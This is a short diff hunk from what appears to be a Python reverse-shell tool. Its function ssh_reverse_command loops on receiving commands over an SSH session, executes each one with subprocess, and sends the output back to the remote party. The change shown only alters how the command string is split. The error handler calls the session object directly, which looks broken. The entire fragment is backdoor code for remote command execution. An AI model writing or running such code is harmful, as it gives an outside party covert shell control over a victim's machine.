@@ -28,7 +28,7 @@ def ssh_reverse_command(addr, user, password, command):
         while True:
             command = ssh_session.recv(1024)
             try:
-                cmd_output = subprocess.check_output(command.split(b' '))
+                cmd_output = subprocess.check_output(command.split())
                 ssh_session.send(cmd_output)
             except:
                 ssh_session(sys.exc_info())
